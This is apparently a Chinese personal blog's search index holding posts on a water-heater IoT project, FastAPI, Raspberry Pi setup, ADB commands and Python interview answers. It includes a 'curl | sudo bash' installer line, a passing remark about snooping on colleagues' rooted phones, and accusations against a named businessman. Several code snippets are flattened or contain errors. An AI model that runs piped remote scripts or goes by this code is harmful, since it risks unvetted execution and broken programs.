{"pages":[{"title":"about","text":"","link":"/about/index.html"}],"posts":[{"title":"热水器改造项目","text":"生活上有一个不便之处是关于热水器的使用，说到这里，务必劝解各位，🤐买房一定不要买☠️万科☠️。 因为热水器🚿是配套赠送的，暂时没有更换的需求，热水器是力诺瑞特电热和太阳能混合的，保证了天气不好的时候可以使用电加热，但是电加热非常不方便，尤其在这个被物联网时代惯坏了时代。在外没法看到热水器的温度显示。想着实现如下功能： 远程观看热水器水温 远程（手机）可点击热水器的加热按钮 在家时候使用天猫精灵进行开启和关闭加热 硬件准备 手里有树莓派、esp32、esp8266和好多开发板，综合考虑使用一块友善之臂的开发板，但是友善之臂开发板的固件非常的不友善，看了一下采用了H3的soc，对比了一下国内有好几家有类似的方案，orangePi,BananaPi,发现香蕉派的M2和友善之臂M1 Plus有着惊人的相似之处，连引脚定义都是相同的，但是香蕉派的固件明显的要友善一些，单从固件大小上就能看出，友善之臂没有打包很多的驱动在内。 尝试将BananaPi的固件刷入友善之臂，竟然完美兼容。😂 要实现温度的读取，如果从热水器内部下手，担心丢失保修，只能从外部下手，使用大的摄像头担心浪费，买了一个esp32-cam模块来拍摄温度显示，然后写个图像的ocr识别来曲线救国。 加热按钮考虑使用舵机来实现模拟人工的按键 数据中心使用Domoticz 树莓派安装Domoticz非常方便 12sudo curl -L install.domoticz.cn | sudo bashsudo apt-get update 运行以上命令后就会进入domoticz的配置界面。 流程图 12345678910participant 客户端 as Aparticipant esp32CAM as Bparticipant 数据中心 as CNote over A:用户账号、密码A-&gt;C: 访问数据中心Note over C:验证账号、密码C--&gt;&gt;A:热水器温度状态A-&gt;C:发送指令C--&gt;&gt;B:发送指令B-&gt;B:自交互 未完待续… 尤其是济南华艺黄运林这个老板经营的地产项目，绝对是坑，项目要配套没有配套在济南开发的这些项目都是合作开发，狗血的是作为万科济南负责人竟然自己注册了个华艺地产，万科和华艺合作。","link":"/2020/01/14/Friendly-Arm/"},{"title":"30-years-old","text":"如果生活是大海，那么其中的每天就像海浪，有的震撼，有的普通。 每年的反省都会发现很多让自己后悔不已的事情，往事并不如烟。 相信命 信命不是极致的悲观、灰暗和迷信，而是理性又成熟深刻的价值观，知道山外有山，才能更加云淡风轻，每个人的起跑线不一样，个体的差异不因意志转移而改变，尊重客观事实才能更好的活自己。 信息差 都说现在互联网时代了，没有什么信息查和信息壁垒，其实信息差永远存在。这一点如果认识的更早一些就好了。天下所有靠培训教育来盈利的都是靠的信息差。 不要把所有的鸡蛋都放在一个篮子里 不要等到拥有几十万再去理财，把收入分成几份，消费，应急，储蓄，年轻的时候不要折腾股票和其他投资，在你认知不能驾驭你所有用的时候，这些拥有都将成为失去，老实把钱存起来，钱多一些，你的自信会更多一些，思维会越来越广。 降低自我预期的阈值 没有人能随便成功，降低预期能让自己好过不少，至少失败的时候能舒服一些，学会接受失败面对现实。 家庭合伙制是婚宴的本质 性格好的女人比漂亮、有才、有钱之类更加优势明显。 不要和老板做朋友 如果和老板称兄道弟，表面越好，后面撕逼就更严重。开始很美丽，结束没道理。 少买或者不买付费知识课程 90%的课程本质上都是垃圾，对你没有任何好处，所有的方法论和成功方式都不适合你，基本连可应用的场景都没有，知识付费本质上是贩卖焦虑，收智商税。省下这些时间读几本经典的书并总结。 买保险 保险是你人生变故后的最后一根救命稻草。 学习一项特长 趁早刻意练习，特长能够让你保持足够的竞争力和优势。 及时止损 错了就是错了，失败了就是失败了，及时抽离。 锻炼身体 这世界是你的，但最终是哪些身体好的。 享受孤独，学会独立思考 孤独并不可耻，每个人都是孤独的，只有自己了解自己。 创业 多去折腾，选择别人而不是被别人选择。 自信坚持 自信能让你获得更多的资源和快感。","link":"/2020/02/28/30-years-old/"},{"title":"FastApi","text":"FastAPI framework, high performance, easy to learn, fast to code, ready for production Documentation: https://fastapi.tiangolo.com 如果应对一个非常简单的需求，比如编写一个接口，总不能直接Django，但也不能写的很糙。如果用Flask，虽然可以用很短的代码写出一个能用的项目，但是需要很多地方需要处理。 如果使用FastApi就会简单很多： 1234567891011121314from fastapi import FastAPIfrom pydantic import BaseModelapp = FastAPI()class People(BaseModel): name:str age:int address:str salary:float@app.post('/insert')def insert(people:People): age_after_10_years = people.age + 10 msg = \"人名：{people.name},十年后的年龄为：{age_after_10_years}' return {'success:'True,'msg':msg} 启动服务后，如果传入错误的值，返回值将会非常友好的告诉你哪里出错了。对类型的检查全部由FastAPI自己完成，非常pythonic。使用fastAPI 需要使用uvicorn来运行FastAPI 12pip install uvicornuvicorn main:app --reload main: 代码文件名 main.pyapp: 初始化FastAPI的对象名–reload 代码修改后立即生效，不需要重启 GET 方法定义1234@app.get('/quert/{uid}')def query(uid): msg = '您查询的uid为：{uid}' return {'success':True,'msg':msg} 直接请求该地址：http://127.0.0.1:8000/query/789如果限定uid的类型，只需要在函数定义时候指定类型 1def quert(uid:int): 除了这些之外，FastAPI还能帮我们快速的生成接口文档。http://127.0.0.1:8000/docs","link":"/2020/01/20/FastApi/"},{"title":"及时行乐","text":"及时行乐（Enjoy Pleasure in Good Time.） 人生苦短,何不及时行乐释义：抓紧时机，不失时机，寻欢作乐。 出处:《新刊大宋宣和遗事》：“人生如白驹过隙，倘不及时行乐，则老大徒伤悲也。”例句：短歌行（曹操）对酒当歌，人生几何？ 譬如朝露，去日苦多。 慨当以慷，忧思难忘。 何以解忧？唯有杜康。 So, there you have it… enjoy!","link":"/2018/08/03/about/"},{"title":"友善之臂移植香蕉派的树莓派系统，并进行精简","text":"使用BPI-M2P-H3 的Raspbian ROM，用etcher烧录到tf卡中，安装xrdp进行远程桌面的登录。 1sudo apt-get install xrdp 安装完成后，使用ifconfig获得本地ip地址，然后使用windows进行远程登陆。在未进行配置之前，使用默认的密码进行初次登录pi bananapi 考虑到此开发板的后期应用场景，需要对此进行精简rom，作为一个单纯的服务端来使用，去除没有必要的组件。 精简操作 删除Games1rm -rf python-games 删除opt目录下的示范代码1sudo rm -rf opt 移除IBM的Node-RED、Mathematica、Scratch、Sonic Pi、Minecraft Pi1sudo apt-get remove --purge --auto-remove nodered wolfram-engine scratch sonic-pi minecraft-pi 移除掉Sense HAT Emulator1sudo apt-get remove --purge --auto-remove python-sense-emu python3-sense-emu python-sense-emu-doc sense-emu-tools 移除Libre Office(后边的*意思是全部移除)1sudo apt-get remove --purge --auto-remove libreoffice* 移除掉浏览器(保留谷歌浏览器,因为项目中用到了谷歌浏览器)1sudo apt-get remove --purge --auto-remove claws-mail rpi-chromium-mods epiphany-browser dillo 移除两套Java IDE：BlueJ与Greenfoot，一套轻量型IDE：Geany1sudo apt-get remove --purge --auto-remove bluej greenfoot geany 执行清洁12sudo apt-get autoremovesudo apt-get clean 升级固件，让固件支持emmc 5.1 升级bpi-tools12sudo subpi-tools 下载升级固件驱动1bpi-update -c bpi-m2p.conf 检查下载的文件格式1file *.tgz 生成bootloader1bpi-bootsel bootloader 生成后将会出现地址 升级bootloader1bpi-bootsel /usr/lib/u-boot/bananapi/bpi-m2p/BPI_M2P_720P.img.gz 使用生成的bootloader 重启1reboot 生成自己的ROMhttp://forum.banana-pi.org/t/how-to-use-bpi-tools-migrate-command-to-build-yourself-image/2019 http://wiki.banana-pi.org/Getting_Started_with_M2P#Load_your_image_on_M2P_EMMC 参考了这两个链接。","link":"/2020/01/19/Friendly-BananaPi-Raspberry/"},{"title":"android-command","text":"每个拥有android手机的人必须要会几条ADB Commands. 掌握一下命令行通过中间人的方式，你的同事的手机如果root过或者在公共场合，可以随意查看他们手机中的资料。所以对于android手机root就等于开放。 ADB = Android Debug Bridge ADB命令有很多，整理一下几条比较常用的如下： 1.查看版本 123$abd versionAndorid Debug Bridge version 1.0.36Revision 8F855A3D9B35-android 2.查看连接设备 123$adb devicesof devices attached02ae0c1021089daf device ``` 3.安装 1adb install 保留数据和缓存文件，重新安装apk： adb install -r安装apk到sd卡： 1adb install -s 4.卸载 12adb uninstall \\\\eg：adb uninstall com.stormzhang.demo 卸载app但保留数据和缓存文件 1adb uninstall -k 5.启动/停止Server 启动Server 1adb start-server 停止Server 1adb kill-server 6.包管理 列出手机装的所有app的包名 1adb shell pm list packages 列出系统应用的所有包名 1adb shell pm list packages -s 列出第三方应用： 1adb shell pm list packages -3 使用grep来过滤 1adb shell pm list packages | grep qq 7.清除应用数据及缓存 1adb shell pm clear 8.启动应用 1adb shell am start -n /.ui.SplashActivity 9.强制停止应用 1adb shell am force-stop 10.查看日志 1adb logcat 11.重启 1adb reboot 12.获取序列号 1$adb get-serialno 13.获取MAC地址 1$adb shell cat /sys/class/net/wlan0/address 14.查看设备型号 1adb shell getprop ro.product.model 15.查看Android系统版本 1$adb shell getprop ro.build.version.release 16.查看屏幕分辨率 1$adb shell wm size 17.检查设备是否已经ROOT 12adb shellsu 18.开启关闭wifi（需ROOT权限） 12adb rootadb shell svc wifi enable/disable 19.音量控制 1adb shell input keyevent 24/25、164 24增加音量，25降低音量 164 静音 20.文件管理 复制电脑里的文件到设备 1adb push &lt;电脑文件路径&gt; &lt;设备里的目录&gt; 复制设备文件到电脑 1adb pull /sdcard/sr.mp4 ~/tmp","link":"/2017/03/01/android-command/"},{"title":"Matplotlib常见问题","text":"最近接了不少学生作业大多数都是预测和数据分析以及分类器相关，所用图表展示用到Matplotlib，经常会涉及到一些问题，对出现的问题进行整理，避免重复踩坑。 中文显示乱码问题图表展示，图例等标识都需要用到中文，如果MATPLOTLIB缺少中文字体的调用，图表显示的时候会出现乱码。 123456789import numpy as npimport matplotlibimport matplotlib.pyplot as pltfrom matplotlib.figure import Figure# 正常显示画图时出现的中文和负号from pylab import mplmpl.rcParams['font.sans-serif']=['SimHei']mpl.rcParams['axes.unicode_minus']=False tight_layout()Matplotlib v1.1 引入一个新的命令tight_layout(),用来调整子图参数，使之填充图像区域，解决Axes轴标签、标题、刻度超出图形区域的问题。 1234567891011121314151617181920212223242526272829def show(self): self.figure.tight_layout() FigureCanvasAgg.draw(self) if PORT is None: return if matplotlib.__version__ &lt; '1.2': buffer = self.tostring_rgb(0, 0) else: buffer = self.tostring_rgb() if len(set(buffer)) &lt;= 1: # do not plot empty return render = self.get_renderer() width = int(render.width) plot_index = index if os.getenv(\"PYCHARM_MATPLOTLIB_INTERACTIVE\", False) else -1 try: sock = socket.socket() sock.connect((HOST, PORT)) sock.send(struct.pack('&gt;i', width)) sock.send(struct.pack('&gt;i', plot_index)) sock.send(struct.pack('&gt;i', len(buffer))) sock.send(buffer) except OSError as _: # nothing bad. It just means, that our tool window doesn't run yet pass 当axes列表为空的时候,tight_layout()将会报错，此时需要将plt.show()替换为plt.savefig(‘file.png’,bbox_inches=’tight’)","link":"/2020/01/10/Matplotlib/"},{"title":"LineageOS 16.0 (Android 9) for Raspberry Pi 3","text":"最近有个需求是需要一个安卓设备，最好是android7 以上系统，总不能豪横的买一个，手里有个Raspberry3B+🚫🍓百度了一下，有几个分享的都是使用Android Things来移植的，Google了一下发现了一个LineageOS 和 emteria.OS可以再3上面运行，那我的3B+肯定也能跑。 About Emteria.OS Emteria.OS is a full build of Android available for Raspberry Pi. While you can get it for free and use it as an individual, it’s aimed more towards industry. Embedded Android devices are big business, and marrying the mobile OS with the Pi opens up a whole new world of Android in both maker projects and consumer products. Emteria.OS 是一个面向工业化使用的android系统，也有面向个人的版本，都是需要收费。相关介绍和安装文档： 📃Emteria.OS 官网:🌐 Emteria.OS About LineageOS LineageOS 16.0 for Raspberry Pi 3 Model B and Model B+. It is unofficial and unsupported by the LineageOS team. It’s for advanced users only. LineageOS 是基于LineageOS 16.0官方版本有个人修改来的，官方并不提供支持。 安装说明文档: 📃 LineageOS 可以正常使用的功能和驱动部分 Audio (HDMI, 3.5mm jack, USB microphones, bluetooth speakers/headsets, etc) Bluetooth Camera (using official Pi camera modules &amp; UVC USB webcams) GPIO GPS (using external USB modules e.g. U-Blox 7) Ethernet Hardware accelerated graphics (VC4) HDMI display I2C IR remotes (using external GPIO IR modules e.g. TSOP4838) RTC (using external GPIO I2C modules e.g. DS3231) Serial console (using external GPIO serial console adapters e.g. PL2303) SPI Touchscreen/multi-touch (using official 7” display with SwiftShafer software renderer) USB (mouse, keyboard, storage, etc) Wifi Wifi tethering不可以正常使用的功能 Hardware video decoding &amp; encoding 烧录ROM过程使用balenaEtcher 将固件烧录到TF卡中。 🔥balenaEtcher 如何安装apk如果需要安装apk，需要安装 opengapps","link":"/2020/04/17/android-for-raspberry/"},{"title":"bigbang","text":"关于Big Bang!前几天看老罗的新品发布会 M1 M1L(据说谐音是满意和满意了)发现新的Smartisan OS 3.0系统里面的Big Bang功能有点像前几天研究的分词。 今天晚上在T1上也受到了OTA的升级推送，体验了一下新版的3.0系统，发现Big Bang 功能的触摸体验不是很好，额 有点偏离主题了。 今天我们来做一下用python实现Big Bang的功能。这里需要用到一个开源的Module，jieba（结巴），可以使用pip进行安装pip install jieba 使用方法： -*- coding:utf-8 -*-123import jiebaseg_list = jieba.cut(“我来到山东大学”, cut_all = True)print “Full Mode:”, ‘ ‘.join(seg_list) #Full Mode: 我 来到 山东 山东大学 东大 大学 #感觉这个分词模式可以用到搜索引擎的优化，得到用户可能搜索的意图seg_list = jieba.cut(“周末可以去帮吱吱搬家”)print “Default Mode:”, ‘ ‘.join(seg_list) #Default Mode: 周末 可以 去 帮 吱吱 搬家↑这个结果完全和Big Bang的爆炸效果完全一样","link":"/2016/10/26/bigbang/"},{"title":"beautifulsoup-useage","text":"之前混合使用bs4、re、lxml 这三个Modules进行解析html的方式虽然可以解决问题但是明显的影响了响应速度，突然发现BS4可以使用CSS Selector方式类似与Xpath的解析。 通过Chrome或者FF 得到tag的CSS Selector 路径使用select可以直接进行使用，明显的代码少了很多行，而且执行速度大大提升。","link":"/2016/09/08/beautifulsoup-useage/"},{"title":"50-python-interview-questions-and-answers","text":"50 Python Interviwe Questions and Answers This post was written by Cameron Wilson, and was originally published at Educative.io 中文翻译由Roy在cx4首发，如需转载请注明出处。 这篇文章涵盖有关Python编程语言的50个面试问题。 基础部分 list和tuple的区别是什么？ 怎样转换list为tuple？ array和list的区别是什么？ Python是怎样进行内存管理的？ 如何在Python中实现多线程？ 什么是monkey patching？ 什么是lambda函数，举例说明什么时候用匿名函数更好，什么时候不行？ 什么是pickling和unpickling? 与嵌套列表相比Numpy数组有什么优势？ 举例说明Python的继承。 python中的多态是什么？ 举例说明range()和xrange()的区别。 举例说明Flask和Django的区别。 什么是PYTHONATH？ 什么是PEP8？ 什么是Python装饰器？ 什么是init? 什么是三元运算符？ 什么是全局变量和局部变量？ 什么是@property? try/except在python中是怎样使用的？ 举例说明Python2和Python3的区别。 什么是join方法？ 什么是字典理解？ 怎样做一次深度copy？ 怎样检查一个键是否在字典中？ 如何在Python中实现记忆优化？ 在Python中如何实现字典排序？ 什么时候使用any()和all(),如何使用？ 什么是python的文档字符串？ 写一个python的函数并举例说明它是怎样运行的。 举例说明迭代器和生成器在Python中的区别。 Python中的defaultdict是什么？ 什么是python的库？ 怎样转换一个list为array？代码部分 反转字符串 检查一个字符串是否在另外一个字符串中 在Python中实施广度优先搜索（BFS） 在Python中实现深度优先搜索(DFS) 实现通配符 在Python中实施合并排序 在Python中实现Dijkstra算法 合并两个排序列表 寻找两个和为‘K’的数字 找到列表中第一个非重复整数 查找链接列表的中间值 颠倒队列中的前“k”个元素 查找二叉搜索树（BST）的高度 将最大堆转换为最小堆 检测链表中的循环 1. list和tuple的区别 List Tuple 列表由可变对象组成。 （创建后可以更改的对象） 元组由不可变的对象组成。 （创建后无法更改的对象） 列表占用很大的内存。 元组占用的内存很小。 列表存储在两个内存块中（一个是固定大小的，另一个是可变大小的，用于存储数据） 元组存储在单个内存块中。 创建列表的速度较慢，因为需要访问两个内存块。 创建元组比创建列表快。 列表中的元素可以删除或替换。 元组中的元素无法删除或替换。 列表中的数据存储在[]括号中。例如[1,2,3] 元组的数据存储在（）括号中。例如（1,2,3） 只要用户知道在元组中插入了什么，就应该使用元组。假设一所大学将其学生的信息存储在一个数据结构中；为了使此信息保持不变，应将其存储在元组中。由于列表为用户提供了更方便的可访问性，因此在需要存储类似类型的对象时应使用它们。例如，如果杂货店需要将所有乳制品存储在一个字段中，则应使用一个列表。 2. 您如何将列表转换为元组？12a = [50,\"hello\",\"Ok\"]b = (a[0],a[1],a[2]) 3. 数组和列表的区别是什么？ List Array Python列表非常灵活，可以保存任意数据。 Python数组只是C数组的一个薄包装。 列表是Python语法的一部分，因此不需要首先声明它们。 首先需要从其他库（即numpy）中导入或声明数组。 列表还可以以省时的方式快速调整大小。这是因为Python在初始化时会初始化列表中的一些额外元素。 数组无法调整大小。相反，需要将一个数组的值复制到另一个更大的数组中。 列表可以保存异构数据。 数组只能存储同质数据。它们的值具有统一的数据类型。 数学函数不能直接应用于列表。相反，必须将它们分别应用于每个元素。 数组是专门为算术计算而优化的。 由于为列表分配了一些额外的元素，因此可以消耗更多的内存，从而可以更快地附加项目。 由于数组保持其首次初始化时的大小，因此它们是紧凑的。 4. 如何在Python中管理内存？ python中的内存管理由Python专用堆空间管理。所有Python对象和数据结构都位于私有堆中。程序员无权访问此私有堆。 python解释器代替了它。 Python对象的堆空间分配是由Python的内存管理器完成的。核心API允许访问一些工具，以便程序员进行编码。 Python还具有一个内置的垃圾收集器，该垃圾收集器回收所有未使用的内存，并使其可用于堆空间。5. 如何在Python中实现多线程？ Python有一个多线程程序包，但是如果您想使用多线程来加快代码速度，那么使用它通常不是一个好主意。 Python具有称为全局解释器锁（GIL）的构造。 GIL确保您的“线程”只能在任何一次执行。线程获取GIL，做一些工作，然后将GIL传递到下一个线程。 这发生得非常快，因此在人眼看来，您的线程似乎是并行执行的，但实际上它们只是使用相同的CPU内核轮流执行。 所有这些GIL传递都会增加执行开销。这意味着，如果您想使代码运行更快，那么使用线程包通常不是一个好主意。6. 什么是猴子修补？在Python中，术语“monkey patch”仅指运行时对类或模块的动态修改。7. 什么是lambda函数？举例说明什么时候有用，什么时候没用。Lambda函数是一个小的匿名函数，它返回一个对象。lambda返回的对象通常被分配给变量或用作其他较大函数的一部分。lambda函数不是用于创建函数的常规def关键字，而是使用lambda关键字定义。lambda的结构如下所示:使用lambda的目的： Lambda比完整功能更具可读性，因为它可以内联编写。因此，当函数表达式较小时，最好使用lambda。 lambda函数的优点在于它们返回函数对象。 当与要求函数对象作为参数的map或filter等函数一起使用时，这使它们很有用。 当表达式超过一行时，Lambda无效。8. 什么是pickling和unpickling?Pickle模块接受任何Python对象并将其转换为字符串表示形式，然后使用转储函数将其转储到文件中，此过程称为pickling。从存储的字符串表示形式检索原始Python对象的过程称为unpickling。9. 与（嵌套）Python列表相比，NumPy数组有什么优势？ Python的列表是有效的通用容器。它们支持（相当）高效的插入，删除，附加和连接，并且Python的列表表达式使它们易于构造和操作。 它们有一定的局限性：它们不支持“向量化”操作，例如逐元素加法和乘法，并且它们可以包含不同类型的对象这一事实意味着Python必须存储每个元素的类型信息，并且在操作时必须执行类型调度代码在每个元素上。 NumPy不仅效率更高，也更加方便。您可以免费获得许多矢量和矩阵运算，避免不必要的工作。 NumPy数组更快，您可以使用NumPy，FFT，卷积，快速搜索，基本统计信息，线性代数，直方图等内置大量内容。10. 举例说明Python中的继承继承允许一个类获取另一类的所有成员（例如属性和方法）。继承提供了代码可重用性，使创建和维护应用程序变得更加容易。我们从中继承的类称为超类，而继承的类称为派生/子类。 单一继承：派生类获取超类的单个成员。 多级继承：从超类A继承的派生类A1，和从B类继承的B2 层次继承：从一个超类可以继承任意数量的子类。 多重继承：派生类继承自多个超类。11. Python中的多态是什么？多态是指采取多种形式的能力。因此，例如，如果父类具有一个名为ABC的方法，那么子类也可以具有一个具有相同名称和参数的ABC方法。Python允许多态。 12. 解释range（）和xrange（）之间的区别在大多数情况下，xrange和range在功能方面完全相同。它们都提供了一种生成整数列表供您使用的方法。唯一的区别是range返回一个Python列表对象，而xrange返回一个xrange对象。这意味着xrange实际上不会像range那样在运行时生成静态列表。它通过一种称为yield的特殊技术根据需要创建值。该技术与一种称为生成器的对象一起使用。 13. 解释Flask和Django之间的区别Django是一个Python网络框架，提供了一个开放源代码的高级框架，“鼓励快速开发和简洁实用的设计”。快速，安全且可扩展。Django提供了强大的社区支持和详细的文档。该框架是一个包容性软件包，在您创建应用程序时，您将在其中获得管理面板，数据库界面和目录结构。此外，它包括许多功能，因此您不必添加单独的库和依赖项。它提供的一些功能包括用户身份验证，模板引擎，路由，数据库模式迁移等等。Django框架非常灵活，您可以在其中与大型公司的MVP一起使用。从某些角度来看，使用Django的一些最大的公司是Instagram，Dropbox，Pinterest和Spotify。 Flask被认为是一个微框架，是一个简约的Web框架。它电量较低，这意味着它缺少Django等全栈框架提供的许多功能，例如网络模板引擎，帐户授权和身份验证。Flask极简且轻巧，这意味着您可以在编写代码时添加所需的扩展和库，而不会被框架自动提供。Flask背后的理念是，它仅提供构建应用程序所需的组件，因此您具有灵活性和控制力。换句话说，它是不受限制的。它提供的一些功能包括：一个内置int开发服务器，Restful请求分派，Http请求处理等等。 14. 什么是PYTHONPATH？它是环境变量，在导入模块时使用。每当导入模块时，都会查找PYTHONPATH以检查各个目录中是否存在导入的模块。解释器使用它来确定要加载哪个模块。 15. 什么是PEP8？PEP代表Python增强提案。这是一组规则，用于指定如何格式化Python代码以实现最大的可读性。 16. 什么是Python装饰器？装饰器是Python中的一种设计模式，允许用户在不修改其结构的情况下向现有对象添加新功能。装饰器通常在要装饰的函数定义之前调用。 17. 什么是初始化init_init__是Python中的方法或构造函数。创建类的新对象/实例时，将自动调用此方法以分配内存。所有类都具有init方法。 18. 什么是三元运算符？三元运算符是用Python编写条件语句的一种方式。顾名思义，此Python运算符由三个操作数组成。 注意：三元运算符可以看作是if-else语句的简化的单行版本，用于测试条件。 语法：三元表达式包含三个操作式： 条件语句：一个布尔表达式，其值为true或false true_val:如果表达式的计算结果为true，则将分配一个值。 false_val: 如果表达式的结果为false，则分配一个值。1var = true_val if condition else false_val 19. Python中的全局变量和局部变量是什么？全局变量在函数外部或全局空间中声明的变量称为全局变量。程序中的任何函数都可以访问这些变量。 局部变量在函数内部声明的任何变量都称为局部变量。此变量存在于局部空间而不是全局空间中。 20. Python中的@property是什么？@property是一个装饰器。在Python中，装饰器使用户能够以相同的方式使用该类（而不管对其属性或方法所做的更改）。@property装饰器允许像属性一样访问函数。 21. 在Python中如何使用try/except？异常是程序执行时发生的错误。发生错误时，程序将停止并生成异常，捕捉异常然后对其进行处理，以防止程序崩溃。程序生成的异常在try块中捕获，并在except块中处理。 22. 解释Python 2和Python 3之间的区别 Python2 Python3 字符串编码Python 2将它们存储为ASCII。Unicode是ASCII的超集，因此可以编码更多字符，包括外来字符。 字符串编码Python 3默认将字符串存储为Unicode。 Python 2除法将floor函数应用于十进制输出并返回整数。因此，将5除以2将返回floor（2.5）= 2。 Python 3中的除法返回期望的输出，即使它是十进制的。 Python 2打印不需要括号。 Python3需要在要打印的内容周围加上括号。 许多较旧的库是专门为Python 2构建的，并不“向上兼容”。 一些较新的库是专门为Python 3构建的，不适用于Python 2。 23. python中的join方法是什么？Python中的join方法采用可迭代数据结构的元素，并使用特定的字符串连接器值将它们连接在一起。 join是如何工作的？Python中的join方法是一个字符串方法，它通过使用特定的字符串作为连接器来连接字符串可迭代结构的元素，该结构还包含字符串或字符（数组，列表等）。 24. 什么是字典？字典表达式是在Python中创建字典的一种方法。它通过合并以列表或数组形式的两组数据来创建字典。两个列表/数组之一的数据将作为字典的键，而第二个列表/数组的数据将作为值。每个键充当每个值的唯一标识符，因此两个列表/数组的大小应相同。 1NewDictionary = {key:value for (key,value) in iterable} 25. 您将如何在Python中进行深层复制？深拷贝是指克隆对象。当使用=运算符时，我们不克隆对象；相反，我们将变量引用到相同的对象（也称为浅表副本）。这意味着更改一个变量的值会影响另一个变量的值，因为它们引用（或指向）同一对象。浅表副本与深表副本之间的区别仅适用于包含其他对象的对象，例如列表和类的实例。 方法此函数将要克隆的对象作为唯一参数，并返回克隆。 语法此函数将要克隆的对象作为唯一参数，并返回克隆。 1a = copy.deepcopy(b) 12345678910111213import copyx = [1,2,3]y = xx[0] = 5x[1] = 15print(\"shallow copy:\",y)a = [10,20,30]b = copy.deepcopy(a)a[1] = 70print(\"deep copy:\",b)Output:shallow copy:[5,15,3]deep copy:[10,20,30] 26. 如何检查Python字典中是否存在键？一种安全的做法是在提取该键的值之前检查该键是否在字典中存在。为此，Python提供了两个内置函数：has_key()如果字典中有给定的键，则has_key方法返回true；否则，返回true。否则，它返回false。if-in表达式此方法使用if-in语句检查字典中是否存在给定键。 123456Fruits = ['a':\"apple\",'b':\"banana\",'c':\"carrot\"]key_to_lookup = 'a'if key_to_lookup in Fruits: print(\"exists\")else: print(\"does not exists\") 27. 您将如何在Python中实现记忆化？对于计算量比较大的代码：1234567#Fibonacci Numbersdef fib(num): if num == 0: return 0 elif num == 1: return 1 return fib(num - 1) + fib(n-1) 记忆化可以通过Python装饰器实现这是完整的实现。 12345678910111213141516171819202122232425import timeitdef memoize_fib(func): cache = {} def inner(arg): if arg not in cache: cache[arg] = func(arg) return cache[arg] return innerdef fib(num): if num == 0: return 0 elif num == 1: return 1 else: return fib(num-1) + fib(num-2)fib = memoize_fib(fib)print(timeit.timeit('fib(30)', globals=globals(), number=1))print(timeit.timeit('fib(30)', globals=globals(), number=1))print(timeit.timeit('fib(30)', globals=globals(), number=1)) 28. 您将如何在Python中对字典进行排序？我们可以通过键或值对这种类型的数据进行排序，这可以通过使用sorted（）函数来完成。首先，我们需要知道如何从字典中检索数据以传递给该函数。 有两种从字典中获取数据的基本方法： Dictionary.keys（）：仅以任意顺序返回键。 Dictionary.values（）：返回值列表。 Dictionary.items（）：返回所有数据作为键值对列表。Sorted（）语法此方法采用一个强制性参数和两个可选参数： 数据（必填）：要排序的数据。我们将使用上述方法之一传递我们检索到的数据。键（可选）：我们要根据其对列表进行排序的功能（或条件）。例如，条件可以是根据字符串的长度或任何其他任意函数对字符串进行排序。此功能应用于列表的每个元素，并对结果数据进行排序。将其保留为空将根据其原始值对列表进行排序。反向（可选）：将第三个参数设置为true将按降序对列表进行排序。保留此空的升序排列。keys() 1234567891011dict = {}dict['1'] = 'apple'dict['3'] = 'orange'dict['2'] = 'pango'lst = dict.keys()# Sorted by keyprint(\"Sorted by key: \", sorted(lst))``` `values()` dict = {}dict[‘1’] = ‘apple’dict[‘3’] = ‘orange’dict[‘2’] = ‘pango’ lst = dict.values() #Sorted by valueprint(“Sorted by value: “, sorted(lst)) 1`items()` dict = {}dict[‘1’] = ‘apple’dict[‘3’] = ‘orange’dict[‘2’] = ‘strawberry’ lst = dict.items() Sorted by keyprint(“Sorted by key: “, sorted(lst, key = lambda x : x[0])) #Sorted by valueprint(“Sorted by value: “, sorted(lst, key = lambda x : x[1])) 12345### 29. &lt;a name=\"29\"&gt;您将如何以及何时使用any（）和all（）？&lt;/a&gt;#### 什么是`any()`?`any（）`是一个函数，它接受一个可迭代的函数（例如列表，元组，集合等），并且如果任何元素的值为真，则返回`True`，但如果所有元素的值为`False`，则返回`False`。 可以通过以下方式将`iterable`传递给`any（）``，以检查是否有任何元素为`True`： one_truth = [True, False, False]three_lies = [0, ‘’, None]print(any(one_truth))print(any(three_lies)) 123#### 什么是`all()`?`all（）`是另一个Python函数，该函数具有一个可迭代的函数，如果所有元素的评估结果均为`True`，则返回`True`，否则返回`False`。 与`any（）`类似，`all（）`接受列表，元组，集合或任何可迭代的对象，如下所示： all_true = [True, 1, ‘a’, object()]one_true = [True, False, False, 0]all_false = [None, ‘’, False, 0]print(all(all_true))print(all(one_true))print(all(all_false)) 12345678910### 30. &lt;a name=\"30\"&gt;什么是Python文档字符串？&lt;/a&gt;Python文档字符串提供了一种将文档与以下内容相关联的合适方法： - Python模块- Python函数- Python类 这是书面代码的指定文件。与常规代码注释不同，篡改应描述函数的功能，而不是功能的作用。 可以使用以下命令访问文档字符串 `__doc__`对象的方法 `help`函数 def Examplefunc(str): #function that outputs the str parameter print(“The value is”, str) #no return statement needed in this function def Multiply(x,y): #function that computes the product of x and y return x*y #returning the product of x and y #Calling the functionsExamplefunc(9) #9 passed as the parameter)answer = Multiply(4,2) #4 and 2 passed as the parametersprint(“The product of x and y is:”,answer) 123456789101112### 32. &lt;a name=\"32\"&gt;解释Python中生成器和迭代器之间的区别。&lt;/a&gt;Python中的迭代器充当对象的持有者，以便可以对其进行迭代；生成器有助于创建自定义迭代器。 ![mark](http://imgs.yrzdm.com/imgs/20200619/kdc8sxg1Do1G.png?imageslim)除了明显的语法差异外，还有一些值得注意的差异：| Generator | Iterator || --- | --- || 使用函数实现 | 使用类实现 || 使用`yield`关键字 | 不使用`yield`关键字 || 代码简洁 | 代码不简洁 || 存储yield语句之前的所有局部变量。 | 没有使用局部变量 |#### 迭代器的实现 Function to generate all the non-negative numbersup to the given non-negative number.class UpTo: # giving the parameter a default value of 0 def init(self, max = 0): self.max = max def iter(self): self.n = 0 return self def next(self): # The next method will throw an # exception when the termination condition is reached. if self.n &gt; self.max: raise StopIteration else: result = self.n self.n += 1 return resultfor number in UpTo(5): print(number) 1#### 生成器的实现 Function to generate all the non-negative numbersup to the given non-negative numberdef upto(n): for i in range(n+1): # The yield statement is what makes a function # a generator yield ifor number in upto(5): print(number) 12345678### 33. &lt;a name=\"33\"&gt;Python中的defaultdict是什么？&lt;/a&gt;Python字典dict包含单词和含义以及任何数据类型的键值对。`defaultdict`是内置`dict`类的另一个细分。 `defaultdict`可以通过给出其声明来创建，该声明可以具有三个值。列出，设置或诠释。根据指定的数据类型，将创建字典，并且当添加或访问`defaultdict`中不存在的任何键时，将为其分配默认值，而不是给出`KeyError`。 举例： 下面的第一个代码段显示了一个简单的字典，以及如何访问dict中不存在的键时如何产生错误。 